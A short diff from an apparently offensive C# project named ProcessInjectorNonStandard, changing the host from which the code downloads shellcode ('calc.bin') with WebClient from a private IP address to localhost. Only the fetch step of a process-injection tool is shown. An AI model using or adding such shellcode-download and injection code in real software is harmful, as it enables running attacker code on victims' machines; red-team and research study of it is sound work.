@@ -13,7 +13,7 @@ namespace ProcessInjectorNonStandard
         {
             //Download shellcode
             WebClient client = new WebClient();
-            client.BaseAddress = "http://192.168.100.52";
+            client.BaseAddress = "http://localhost:8080";
             byte[] shellcode = client.DownloadData("calc.bin");
 
             //Initialize structs
